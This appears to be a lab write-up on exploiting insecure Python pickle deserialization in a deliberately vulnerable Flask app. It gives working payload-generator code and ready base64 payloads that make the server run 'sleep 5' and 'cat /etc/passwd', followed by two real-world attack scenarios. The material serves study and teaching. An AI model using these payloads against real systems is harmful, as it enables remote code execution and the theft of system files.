# Payloads and Exploitation Scenarios

This document contains the malicious payloads used to exploit the Insecure Deserialization vulnerability in the vulnerable Flask application. It also describes real-world scenarios where this vulnerability can happen.

## 1. The Payloads

### Payload A: Proof of Concept (Time-Based Test)
Before extracting data, we need to prove that the server executes our commands. We use a time-delay command (`sleep 5`). If the server delays its response by 5 seconds, it means the vulnerability exists.

**Python Code to generate the payload:**
```python
import pickle
import base64
import os

class TimePayload(object):
    def __reduce__(self):
        # Tells the server to sleep for 5 seconds
        return (os.system, ('sleep 5',))

payload_obj = TimePayload()
pickled_data = pickle.dumps(payload_obj)
base64_payload = base64.b64encode(pickled_data).decode('utf-8')
print(base64_payload)
```
**Resulting Base64 Payload:**
```text
gASVLQAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjAdzbGVlcCA1lIWUUpQu
```

### Payload B: Data Extraction (Reading /etc/passwd)
This is the main payload used to achieve the project's goal. Instead of just running a command in the background, we use `subprocess.getoutput` to run the command `cat /etc/passwd` and return the text output to the screen.

**Python Code to generate the payload:**
```python
import pickle
import base64
import subprocess

class ExtractDataPayload(object):
    def __reduce__(self):
        # Executes the command and captures the output
        return (subprocess.getoutput, ('cat /etc/passwd',))

payload_obj = ExtractDataPayload()
pickled_data = pickle.dumps(payload_obj)
base64_payload = base64.b64encode(pickled_data).decode('utf-8')
print(base64_payload)
```
**Resulting Base64 Payload:**
```text
gASVPgAAAAAAAACMCnN1YnByb2Nlc3OUjAlnZXRvdXRwdXSUk5SMD2NhdCAvZXRjL3Bhc3N3ZJSFlFKULg==
```

---

## 2. Real-World Exploitation Scenarios

Here are two different scenarios where this vulnerability could be exploited in the real world:

### Scenario 1: Malicious Session Cookies (User-Facing)
A web application uses Python's `pickle` to store user session details (like username, theme color, and role) inside a cookie. The server sends this cookie to the user's browser. An attacker can intercept this cookie, replace the normal session data with a malicious serialized object (like the payloads above), and send it back to the server. When the server deserializes the cookie to check the user's login status, it accidentally runs the attacker's code, leading to a full server takeover.

### Scenario 2: API Endpoints (Backend-to-Backend)
A company has a mobile app that sends data to a backend API. The developers decided to use serialized objects to send complex data structures (like user activity logs) because it was easier than converting everything to JSON. An attacker analyzes the network traffic between the mobile app and the API, discovers that the API accepts serialized data, and sends a crafted object to the API endpoint. When the API processes the log data, the malicious code executes, giving the attacker access to the company's internal network.